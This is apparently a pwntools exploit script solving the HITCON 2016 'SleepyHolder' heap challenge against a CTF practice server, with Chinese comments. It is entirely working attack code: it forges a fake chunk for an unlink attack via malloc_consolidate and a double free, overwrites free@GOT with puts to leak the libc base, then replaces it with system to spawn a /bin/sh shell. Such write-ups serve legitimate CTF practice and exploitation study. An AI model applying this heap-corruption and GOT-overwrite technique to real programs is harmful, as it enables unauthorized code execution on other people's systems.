from pwn import *

context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

libc = ELF('/home/sev1n/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')

elf = ELF('./sleepyHolder_hitcon_2016')

#context.log_level = 'debug'
debug = 0

if debug:
    io = process('./sleepyHolder_hitcon_2016')
else:
    io = remote('node4.buuoj.cn',27338)

def p():
    gdb.attach(proc.pidof(io)[0])

one_gadget = [0x45226,0x4527a,0xf03a4,0xf1247]

def new(idx,content):
    io.sendlineafter(b"Renew secret",b'1')
    io.sendlineafter(b"Big secret",str(idx))
    io.sendafter(b"Tell me your secret:",content)

def delete(idx):
    io.sendlineafter(b"Renew secret",b'2')
    io.sendlineafter(b"Big secret",str(idx))

def edit(idx,content):
    io.sendlineafter(b"Renew secret",b'3')
    io.sendlineafter(b"Big secret",str(idx))
    io.sendafter(b"Tell me your secret:",content)

small_mem = 0x6020d0
big_mem = 0x6020c0

new(1,b'AAAA')
new(2,b'aaaa')
#p()
delete(1)
new(3,b'aaaa') # 调用malloc_consolidate ,small chunk 进unsortebin，nextchunk的p位设置成0
#p()
delete(1) # small 又进到fastbin,所以等会malloc的时候不会设置nextchunk的p位
new(1,b'aaaa')
#p()

#伪造fackchunk
fack_fb = small_mem - 0x18
fack_bk = small_mem - 0x10
over_flow = p64(0) + p64(0x21) + p64(fack_fb) + p64(fack_bk) + p64(0x20)
edit(1,over_flow)
delete(2)
#p()

# 布置bss段，泄漏libc和getshell
over_flow = b'/bin/sh\x00' # 0x6020b8
#over_flow += p64(elf.got['puts']) # big_mem idx=2
over_flow += p64(elf.got['puts']) # big_mem idx=2
payload_addr = elf.got['free']
over_flow += p64(0) + p64(payload_addr)
edit(1,over_flow)
#p()

payload = p64(elf.plt['puts'])
edit(1,payload)
delete(2)
libc_base = u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00')) - libc.symbols['puts']
success("libc_base -->" + hex(libc_base))

#p()
payload = p64(libc_base + libc.symbols['system'])
edit(1,payload)
new(2,b'aaaa')
edit(2,b'/bin/sh\x00')
delete(2)

io.interactive()
